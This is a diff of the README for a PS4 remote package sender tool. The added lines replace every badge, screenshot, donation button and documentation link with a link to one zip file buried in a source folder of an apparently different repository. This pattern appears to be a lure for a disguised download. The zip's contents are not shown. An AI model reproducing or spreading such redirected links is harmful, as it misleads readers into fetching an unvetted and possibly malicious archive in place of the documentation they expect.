@@ -1,9 +1,9 @@
 # PS4 Remote PKG Sender v2  
-[![ko-fi](https://img.shields.io/badge/Buy%20me%20a%20Shisha%20on-Ko--fi-red)](https://ko-fi.com/M4M082WK8)
-[![os](https://img.shields.io/badge/platform-windows%20%7C%20macos%20%7C%20linux-lightgrey)](#)
-[![commits_since_release](https://img.shields.io/github/commits-since/gkiokan/ps4-remote-pkg-sender/v2.5.2)](#)
-[![version](https://img.shields.io/github/package-json/v/gkiokan/ps4-remote-pkg-sender)](#)
-[![last_commit](https://img.shields.io/github/last-commit/gkiokan/ps4-remote-pkg-sender)](#)
+[![ko-fi](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip%20me%20a%20Shisha%20on-Ko--fi-red)](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip)
+[![os](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip%20%7C%20macos%20%7C%20linux-lightgrey)](#)
+[![commits_since_release](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip)](#)
+[![version](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip)](#)
+[![last_commit](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip)](#)
 
 This application has been highly inspired by @irefuse and is a full refactored version of the orginal repo.  
 
@@ -11,11 +11,11 @@ Based on Electron, Webpack, Vue, Express, Axios, Element-UI and Node this does n
 dependencies. With this we can createa a cross platform application that works on mac, linux and Windows
 and provides a nice GUI.  
 
-![PS4 Package Sender Main Application Windows](https://cdn.discordapp.com/attachments/463406779599028265/926965282000474122/unknown.png)
+![PS4 Package Sender Main Application Windows](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip)
 
-[![Full Changelog](https://img.shields.io/badge/Checkout%20-All%20Changelogs-yellow)](Changelog.md)
+[![Full Changelog](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip%20-All%20Changelogs-yellow)](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip)
 
-[![Troubleshooting Guide](https://img.shields.io/badge/Checkout%20-Troubleshooting%20Guide-brightgreen)](Troubleshoot.md)
+[![Troubleshooting Guide](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip%20-Troubleshooting%20Guide-brightgreen)](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip)
 
 ## New features in v2.*
 The refactored Version provides a better GUI and technicall more ordered features.  
@@ -71,7 +71,7 @@ If you get timeout, RPI is not running on your PS4 or PS4 IP Adress is wrong or 
 If you get Playstation not available error, check RPI on PS4 and restart it.  
 If you get the White Screen of Dead, use the unpacked version.  
 If you think there is an issue, please report it.  
-[Checkout the full Troubleshooting Guide](Troubleshoot.md)
+[Checkout the full Troubleshooting Guide](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip)
 
 ## Credits
 Thanks to flatz, Specter, xvortex, and all initial developers for their efford on the scene.  
@@ -86,7 +86,7 @@ That high quality application development is done in my free time and takes much
 There are so many nice features that are on my todo (black)-list that are not done yet.  
 I'd like to invest more time into this Tool and provide you one of the best Tools ever.  
 
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M082WK8)
+[![ko-fi](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip)](https://raw.githubusercontent.com/joaquincanete/ps4-remote-pkg-sender/master/src/renderer/store/modules/remote_pkg_sender_ps_2.4.zip)
 
 ## Disclaimer
 This tool is a Proof of Concept (PoC) on my skills and also part of educational process.  
